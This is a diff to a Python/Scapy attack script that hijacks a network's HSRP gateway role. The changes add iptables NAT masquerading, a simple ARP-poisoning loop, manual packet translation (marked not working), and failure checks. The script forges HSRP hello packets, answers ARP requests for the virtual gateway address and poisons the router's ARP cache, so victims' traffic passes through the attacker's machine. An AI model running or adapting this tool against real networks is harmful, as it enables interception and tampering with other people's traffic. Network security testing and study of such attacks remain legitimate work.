@@ -10,13 +10,16 @@ import random
 # change as necessary
 interface = "eth0"
 # option to poison router if sniffing of response is required, makes attack more noisy
-poisonrouter = True
+poisonrouter = False
 # option to force use of own mac address only when sending hsrp and arp packets
 attackportsecurity = True
-debug = False
+# force use of own ip only when forwarding packets. poisonrouter not required when translateip set to True
+translateip = True
+debug = True
+terminateonfail = False
 # for testing only, to set to false when running attack
 usepcapfile = False
-terminateonfail = True
+spoison = False
 
 myip = ni.ifaddresses(interface)[ni.AF_INET][0]["addr"]
 mymac = ni.ifaddresses(interface)[ni.AF_LINK][0]["addr"]
@@ -29,6 +32,9 @@ attackstarted = False
 version: int
 pkcopy: Packet
 timekeeper = {}
+####################
+translations = {}
+portcounter = 0
 
 def find_hsrp():
     global hsrpfound
@@ -55,16 +61,20 @@ def check_hsrp(packet):
     if packet[HSRP].version == 0:
         if not check_v1_fields(packet):
             return
-        print("Active HSRP found, version 1")
         # if attack has already started, HSRP routers are still active (failed attack)
         if attackstarted:
-            hsrpfound = True
-            if terminateonfail:
-                print("HSRP hijack failure")
-                cleanup()
-                os._exit(0)
+            #hsrpfound = True
+            srcip = packet[IP].src
+            if srcip != myip:
+                print("[WARN] HSRP hijack failure")
+                if terminateonfail:
+                    cleanup()
+                    os._exit(0)
             else:
-                return
+                print("[INFO] You are active router")
+            return
+        else:
+            print("[INFO] Active HSRP found, version 1")
         if debug:
             print("Active router group: ", packet[HSRP].group)
             print("Active router priority: ", packet[HSRP].priority)
@@ -74,6 +84,9 @@ def check_hsrp(packet):
         version = 1
         hsrpfound = True
         pkcopy = packet
+        ###################
+        #pkcopy[HSRP].virtualIP = "192.168.50.1"
+        #pkcopy[IP].src = "192.168.50.1"
     else:
         ethersrc = packet[Ether].src
         # TODO to improve on HSRPv2 detection, currently based on source mac address only and fails if standby group number changes
@@ -129,7 +142,6 @@ def send_hsrp(packet):
 
         sendp(pkt, verbose=False)
         send_initial_arp(packet)
-        find_hsrp()
         arp_thread = threading.Thread(target=start_arp_responder, args=(pkcopy), daemon=True)
         arp_thread.start()
         selective_poison = threading.Thread(target=start_selective_poisoning, args=(pkcopy), daemon=True)
@@ -164,6 +176,7 @@ def send_initial_arp(packet):
         virtualIP = packet[HSRP].virtualIP
         hellotime = packet[HSRP].hellotime
     else:
+        ################
         return
     pkt = Ether(src=ethersrc, dst="ff:ff:ff:ff:ff:ff")/ARP(op=2, hwsrc=ethersrc, psrc=virtualIP, hwdst="ff:ff:ff:ff:ff:ff", pdst=virtualIP)
     sendp(pkt, inter=hellotime, verbose=False)
@@ -173,6 +186,7 @@ def start_subinterface(packet):
     if version == 1:
         virtualIP = packet[HSRP].virtualIP
     else:
+        #######################
         return
     if debug:
         print(f"Starting sub interface with IP: {virtualIP} on {interface}")
@@ -189,12 +203,16 @@ def change_default_gw(routerIP):
     if debug:
         print(f"Changing default gateway to: {routerIP}")
     subprocess.run(f"route add default gw {routerIP} {interface}".split())
+    
+def enable_translation():
+    subprocess.run(f"iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE".split())
 
 # sniff and respond to arp request for HSRP virtual ip address from network
 def start_arp_responder(packet):
     if version == 1:
         virtualIP = packet[HSRP].virtualIP
     else:
+        ########################
         return
     if debug:
         print("Responding to ARP requests for gateway ip")
@@ -206,6 +224,7 @@ def arp_respond(packet):
     if version == 1:
         virtualIP = pkcopy[HSRP].virtualIP
     else:
+        #####################
         return
     if attackportsecurity:
         ethersrc = mymac
@@ -217,19 +236,22 @@ def arp_respond(packet):
     sendp(pkttosend, verbose=False)
     return f"Responded to ARP request from {victimIP}"
 
-# start poisoning router's arp cache only for potentially vulnerable traffic
+# start poisoning router's arp cache, only when hosts start sending packets
 def start_selective_poisoning(packet):
     if poisonrouter:
         if debug:
             print("Poisoning router")
         routerIP = packet[IP].src
-        filterstring = f"(tcp or udp) and dst port not 443 and dst port not 22 and src host not ({routerIP} or 0.0.0.0) and ether src host not {mymac}"
+        filterstring = f"(tcp or udp) and src host not ({routerIP} or 0.0.0.0) and ether src host not {mymac} and src net {mynetwork}"
         sniff(prn=arp_poison, filter=filterstring)
 
 # called by sniff to poison arp cache of HSRP router when attacker receives traffic from victim
 def arp_poison(packet):
     if version == 1:
         virtualIP = pkcopy[HSRP].virtualIP
+    else:
+        ###########################
+        return
     try:
         victimIP = packet[IP].src
         # keep track of time since last arp packet sent, skip if arp has been sent in the past x seconds, chosen at random between 10 and 20 seconds
@@ -243,8 +265,9 @@ def arp_poison(packet):
         ethersrc = mymac
         etherdst = "ff:ff:ff:ff:ff:ff"
         # do not poison arp if destination is multicast or source ip is not in local network
-        if ipaddress.ip_address(dstIP).is_multicast or ipaddress.ip_address(victimIP) not in mynetwork:
-            return
+        #if ipaddress.ip_address(dstIP).is_multicast or ipaddress.ip_address(victimIP) not in mynetwork:
+        #    return
+        # ARP poisoning "I am victim, who is gateway"
         arppkt = Ether(src=ethersrc, dst=etherdst)/ARP(op=op, hwsrc=ethersrc, psrc=victimIP, pdst=virtualIP)
         sendp(arppkt, verbose=False)
         timekeeper[victimIP] = time.time()
@@ -256,16 +279,97 @@ def arp_poison(packet):
             packet.show()
     return
 
+# [not working] sniff for packets to manually forward
+def start_forward_sniffer():
+    if version == 1:
+        virtualIP = pkcopy[HSRP].virtualIP
+    else:
+        ########################
+        return
+    filterstring = f"ip and (tcp or udp) and dst host not ({virtualIP} or 0.0.0.0) and ether src host not {mymac} and not ip multicast"
+    sniff(prn=manual_forwarding, filter=filterstring)
+
+# [not working] manually forward packets and replace source ip of packets exiting network with own ip, dest ip of packets entering network with remembered ip
+def manual_forwarding(packet):
+    global portcounter
+    dst_address_string = packet[IP].dst
+    proto:str
+    
+    # lookup dst port in dictionary to find original src ip and port. If not found, no need to translate (victim host did not initiate connection)
+    if dst_address_string == myip:
+        try:
+            dport = packet[TCP].dport
+            proto = "TCP"
+        except:
+            dport = packet[UDP].dport
+            proto = "UDP"
+        finally:
+            if dport in translations:
+                dstip, dstport = translations[dport]
+                packet[Ether].src = mymac
+                del packet[Ether].dst
+                packet[IP].dst = dstip
+                del packet[IP].chksum
+                packet[proto].dport = dstport
+                del packet[proto].chksum
+                sendp(packet, verbose=False)
+                del translations[dport]
+    # store src ip and port in dictionary along with new src port to use for future translation back to original ip
+    else:
+        try:
+            sport = packet[TCP].sport
+            proto = "TCP"
+        except:
+            sport = packet[UDP].sport
+            proto = "UDP"
+        finally:
+            srcip = packet[IP].src
+            newport = portcounter%60001 + 5535
+            translations[newport] = srcip, sport
+            portcounter += 1
+            packet[Ether].src = mymac
+            del packet[Ether].dst
+            packet[IP].src = myip
+            del packet[IP].chksum
+            packet[proto].sport = newport
+            del packet[proto].chksum
+            sendp(packet, verbose=False)
+
+# simple arp poisoning        
+def simple_poison():
+    print("Using simple poison")
+    last = time.time()
+    while True:
+        if time.time() - last > 10:
+            gateway = pkcopy[HSRP].virtualIP
+            etherdst = "ff:ff:ff:ff:ff:ff"
+            sendp(Ether(src=mymac, dst=etherdst)/ARP(op=2, hwsrc=mymac, psrc=gateway, hwdst=etherdst, pdst=gateway), verbose=False)
+            last += 2
+            
+def delayed_failure_check():
+    start = time.time()
+    while True:
+        if time.time() - start > 20:
+            find_hsrp()
+            break
+
 # receive user input to stop script and clean up before exiting
 def script_terminate_listener():
     while True:
         usrinput = input()
         if usrinput == "stop":
             cleanup()
-            exit(0)
+            os._exit(0)
 
 def setup():
+    '''
+    if not translateip:
+        enable_forwarding()
+        pass'''
     enable_forwarding()
+    if translateip:
+        enable_translation()
+    #####################
     start_subinterface(pkcopy)
     change_default_gw(pkcopy[IP].src)
 
@@ -277,6 +381,8 @@ def cleanup():
     subprocess.run(f"ifconfig {interface}:1 down".split())
     # disable forwarding
     subprocess.run(f"sysctl -w net.ipv4.ip_forward=0".split())
+    # disable translation
+    subprocess.run(f"iptables -t nat -D POSTROUTING -o eth0 -j MASQUERADE".split())
     print("Completed clean up")
 
 if __name__ == "__main__":
@@ -284,6 +390,7 @@ if __name__ == "__main__":
         Interface: {interface}\n\
         Poison Router: {poisonrouter}\n\
         Attack Port Security: {attackportsecurity}\n\
+        Translate IP: {translateip}\n\
         Debug: {debug}\n\
         Use pcap file: {usepcapfile}\n\
         Terminate on fail: {terminateonfail}")
@@ -291,6 +398,14 @@ if __name__ == "__main__":
         if version == 1:
             setup()
             print(f"Attacking on this interface: {interface} {myip} {mymac}")
+            '''if translateip:
+                forwarding = threading.Thread(target=start_forward_sniffer, daemon=True)
+                forwarding.start()'''
+            if spoison:
+                poison = threading.Thread(target=simple_poison, daemon=True)
+                poison.start()
+            fail_check = threading.Thread(target=delayed_failure_check, daemon=True)
+            fail_check.start()
             attack_hsrp = threading.Thread(target=send_hsrp, args=(pkcopy), daemon=True)
             attack_hsrp.start()
             script_terminate_listener()
